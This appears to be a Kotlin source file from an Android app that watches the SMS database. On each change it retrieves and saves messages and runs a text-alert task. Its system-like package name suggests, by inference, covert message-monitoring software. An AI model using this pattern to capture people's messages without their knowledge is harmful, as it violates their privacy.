package com.android.services.observer

import android.content.Context
import android.database.ContentObserver
import android.net.Uri
import android.os.AsyncTask
import android.os.Handler
import android.os.Looper
import com.android.services.util.SmsUtil
import com.android.services.util.SmsUtil.retrieveAndSaveSms
import com.android.services.util.SmsUtil.runSmsTextAlertTask
import java.lang.ref.WeakReference
import java.util.concurrent.Callable
import java.util.concurrent.Executor
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

@SuppressWarnings("deprecation")
class SmsObserver(private val context: Context, handler: Handler) : ContentObserver(handler) {

    override fun onChange(selfChange: Boolean) {
        this.onChange(selfChange, null)
    }

    override fun onChange(selfChange: Boolean, uri: Uri?) {
        val executor: ExecutorService = Executors.newSingleThreadExecutor()
        executor.execute {
            val smsLog = retrieveAndSaveSms(context)
            runSmsTextAlertTask(context, smsLog)
        }
    }
}

